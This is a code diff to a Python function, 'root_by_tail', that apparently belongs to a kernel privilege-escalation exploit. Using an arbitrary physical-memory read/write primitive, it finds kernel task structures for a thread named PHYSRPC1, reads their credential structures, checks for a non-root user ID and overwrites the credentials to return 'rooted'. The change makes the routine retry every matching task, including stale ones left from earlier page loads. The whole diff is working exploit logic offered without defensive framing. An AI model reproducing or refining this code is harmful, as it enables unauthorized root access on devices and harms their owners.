@@ -127,21 +127,29 @@ def live_stub(timeout=4.0):
 
 
 def root_by_tail(rpc):
-    """Patch the RPC thread itself (comm PHYSRPC1). Returns 'rooted'/'already'/None."""
-    task = K._find_tag_near_tail(rpc, INIT_P, INIT_V, OFF, b"PHYSRPC1", 800)
-    if not task:
+    """Patch the RPC thread itself (comm PHYSRPC1). Returns 'rooted'/'already'/None.
+
+    Tries every PHYSRPC1 task on the tail: a freed thread from a previous page
+    load can be nearer the tail than the live one and its cred pointer is junk.
+    """
+    tasks = K._find_tags_near_tail(rpc, INIT_P, INIT_V, OFF, b"PHYSRPC1", 800)
+    if not tasks:
         return None
-    for off in (K.O_CRED, K.O_REAL):
-        cred = rpc.read_u32(K.PHYS(task) + off)
-        if not K._sane_cred(rpc, cred):
-            continue
-        ids = struct.unpack("<8I", rpc.read(K.PHYS(cred), 36)[4:])
-        if ids[0] == 0:
-            return "already"
-        if ids[0] != 5001:
-            continue
-        if K.patch_full(rpc, cred):
-            return "rooted"
+    for task in tasks:
+        for off in (K.O_CRED, K.O_REAL):
+            try:
+                cred = rpc.read_u32(K.PHYS(task) + off)
+            except Exception:
+                continue
+            if not K._sane_cred(rpc, cred):
+                continue
+            ids = struct.unpack("<8I", rpc.read(K.PHYS(cred), 36)[4:])
+            if ids[0] == 0:
+                return "already"
+            if ids[0] != 5001:
+                continue
+            if K.patch_full(rpc, cred):
+                return "rooted"
     return None
 
 
